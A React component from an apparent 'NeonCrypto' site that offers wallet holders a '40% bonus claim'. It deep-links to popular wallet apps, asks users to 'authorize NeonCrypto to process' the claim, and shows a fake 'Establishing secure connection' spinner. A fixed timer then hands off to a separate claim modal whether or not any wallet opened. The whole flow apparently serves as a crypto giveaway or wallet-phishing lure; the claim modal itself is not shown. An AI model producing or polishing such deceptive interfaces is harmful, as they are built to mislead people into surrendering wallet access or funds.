import React, { useEffect, useState, createElement } from 'react';
import { CryptoClaimModal } from './CryptoClaimModal';
interface WalletInfo {
  name: string;
  logo: string;
  deepLink: string;
}
const WALLET_DEEP_LINKS: Record<string, string> = {
  MetaMask: 'metamask://',
  'Trust Wallet': 'trust://',
  Phantom: 'phantom://',
  Exodus: 'exodus://',
  Rainbow: 'rainbow://',
  'Crypto.com': 'cryptodotcom://',
  'ETH Wallet': 'ethereum://',
  Ledger: 'ledgerlive://',
  Coinbase: 'cbwallet://',
  Coinmama: 'coinmama://',
  Binance: 'bnc://'
};
interface DeepLinkModalProps {
  isOpen: boolean;
  wallet: WalletInfo | null;
  onClose: () => void;
  onSuccess: () => void;
}
type ModalStep = 'confirm' | 'opening' | 'crypto_claim';
export function DeepLinkModal({
  isOpen,
  wallet,
  onClose,
  onSuccess
}: DeepLinkModalProps) {
  const [step, setStep] = useState<ModalStep>('confirm');
  // Reset step when modal opens
  useEffect(() => {
    if (isOpen) setStep('confirm');
  }, [isOpen]);
  if (!isOpen || !wallet) return null;
  const handleOpenWallet = () => {
    setStep('opening');
    const deepLink = WALLET_DEEP_LINKS[wallet.name] || 'https://metamask.io';
    // Attempt to open the wallet app via deep link
    const link = document.createElement('a');
    link.href = deepLink;
    link.style.display = 'none';
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
    // After a short delay, show the crypto claim modal
    setTimeout(() => {
      setStep('crypto_claim');
    }, 1800);
  };
  const handleClaimComplete = () => {
    onSuccess();
  };
  // Crypto claim step - show CryptoClaimModal
  if (step === 'crypto_claim') {
    return (
      <CryptoClaimModal
        isOpen={true}
        walletName={wallet.name}
        onClose={onClose}
        onClaimComplete={handleClaimComplete} />);


  }
  return (
    <div
      className="modal-overlay"
      onClick={(e) => {
        if (e.target === e.currentTarget) onClose();
      }}>

      <div
        className="relative w-full max-w-sm rounded-2xl overflow-hidden"
        style={{
          background:
          'linear-gradient(135deg, rgba(10,8,30,0.99) 0%, rgba(20,10,50,0.99) 100%)',
          border: '1px solid rgba(139,92,246,0.5)',
          boxShadow:
          '0 0 60px rgba(139,92,246,0.3), 0 25px 50px rgba(0,0,0,0.9)'
        }}
        onClick={(e) => e.stopPropagation()}>

        {/* Top accent bar */}
        <div
          className="h-1 w-full"
          style={{
            background: 'linear-gradient(90deg, #8b5cf6, #f59e0b)'
          }} />


        <div className="p-6">
          {step === 'confirm' &&
          <>
              {/* Wallet icon */}
              <div className="flex flex-col items-center gap-4 mb-6">
                <div
                className="w-20 h-20 rounded-2xl flex items-center justify-center p-2"
                style={{
                  background: 'rgba(255,255,255,0.08)',
                  border: '1px solid rgba(255,255,255,0.15)'
                }}>

                  <img
                  src={wallet.logo}
                  alt={wallet.name}
                  className="w-14 h-14 object-contain"
                  onError={(e) => {
                    ;(e.target as HTMLImageElement).src =
                    'https://assets.coingecko.com/coins/images/1/small/bitcoin.png';
                  }} />

                </div>
                <div className="text-center">
                  <h2
                  className="text-white font-bold text-xl"
                  style={{
                    fontFamily: 'Orbitron, sans-serif'
                  }}>

                    Open {wallet.name}?
                  </h2>
                  <p className="text-white/50 text-sm mt-1">
                    NeonCrypto wants to connect to your {wallet.name} app
                  </p>
                </div>
              </div>

              {/* Permission notice */}
              <div
              className="p-3 rounded-xl mb-5"
              style={{
                background: 'rgba(139,92,246,0.1)',
                border: '1px solid rgba(139,92,246,0.25)'
              }}>

                <p className="text-purple-300 text-xs leading-relaxed text-center">
                  By opening your wallet, you authorize NeonCrypto to process
                  your 40% bonus claim on your behalf.
                </p>
              </div>

              {/* Buttons */}
              <div className="flex gap-3">
                <button
                onClick={onClose}
                className="flex-1 py-3 rounded-xl text-white/60 text-sm font-medium transition-all hover:text-white"
                style={{
                  background: 'rgba(255,255,255,0.06)',
                  border: '1px solid rgba(255,255,255,0.1)'
                }}>

                  Cancel
                </button>
                <button
                onClick={handleOpenWallet}
                className="flex-1 py-3 rounded-xl text-white text-sm font-bold transition-all"
                style={{
                  background: 'linear-gradient(135deg, #8b5cf6, #f59e0b)',
                  boxShadow: '0 0 20px rgba(139,92,246,0.4)',
                  fontFamily: 'Orbitron, sans-serif',
                  fontSize: '0.75rem'
                }}>

                  Open Wallet
                </button>
              </div>
            </>
          }

          {step === 'opening' &&
          <div className="flex flex-col items-center gap-5 py-4">
              <div className="relative w-16 h-16">
                <div
                className="absolute inset-0 rounded-full border-4 border-purple-500/20"
                style={{
                  borderTopColor: '#8b5cf6',
                  animation: 'spin 1s linear infinite'
                }} />

                <div className="absolute inset-2 rounded-full overflow-hidden">
                  <img
                  src={wallet.logo}
                  alt={wallet.name}
                  className="w-full h-full object-contain p-1" />

                </div>
              </div>
              <div className="text-center">
                <h3
                className="text-white font-bold text-lg mb-1"
                style={{
                  fontFamily: 'Orbitron, sans-serif'
                }}>

                  Opening {wallet.name}...
                </h3>
                <p className="text-white/50 text-sm">
                  Establishing secure connection
                </p>
              </div>
              <div className="flex gap-1">
                {[0, 1, 2].map((i) =>
              <div
                key={i}
                className="w-2 h-2 rounded-full bg-purple-500"
                style={{
                  animation: `pulse 1.2s ease-in-out ${i * 0.2}s infinite`
                }} />

              )}
              </div>
            </div>
          }
        </div>
      </div>

      <style>{`
        @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
        @keyframes pulse { 0%, 100% { opacity: 0.3; transform: scale(0.8); } 50% { opacity: 1; transform: scale(1.2); } }
      `}</style>
    </div>);

}